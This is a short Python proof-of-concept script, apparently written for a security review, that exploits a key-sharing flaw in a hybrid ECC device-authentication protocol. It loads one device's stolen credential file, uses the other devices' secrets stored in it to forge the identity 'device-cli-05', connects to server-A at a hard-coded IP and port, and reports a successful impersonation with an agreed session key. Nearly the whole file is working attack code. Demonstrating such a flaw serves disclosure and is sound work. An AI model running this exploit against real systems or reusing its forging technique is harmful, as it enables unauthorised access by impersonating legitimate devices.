"""Finding demo: an attacker holding ONLY device-001's credential file forges
a device-cli-05 identity and authenticates to server-A as device-cli-05.
Works because `hea-ta enroll` full-mesh-shares every entity's lambda with every
other entity, and k*_ij = KDF(lambda_device || lambda_server)."""
import socket
from hybrid_ecc_auth.demo import _transport
from hybrid_ecc_auth.protocol.device import Device
from hybrid_ecc_auth.protocol.ta import Credential
from hybrid_ecc_auth.storage.keystore import KeyStore

stolen = KeyStore("creds/device-001.json").load()
victim = "device-cli-05"
print(f"attacker holds credential for {stolen.identity!r}; peer lambdas present: {sorted(stolen.peer_secrets)}")
forged = Credential(identity=victim, role="device", lam=stolen.peer_secrets[victim],
                    peer_secrets={"server-A": stolen.peer_secrets["server-A"]})
dev = Device(forged)
m1 = dev.build_auth_request("server-A")
with socket.create_connection(("172.31.14.202", 8443), timeout=5) as s:
    _transport.send_frame(s, m1)
    env = _transport.parse_envelope(_transport.recv_frame(s))
print("server response ok =", env["ok"], "" if env["ok"] else env)
if env["ok"]:
    dev.complete_auth(env["payload"].encode())
    print(f"IMPERSONATION SUCCEEDED: server-A accepted the attacker as {victim!r} and a session key was agreed.")
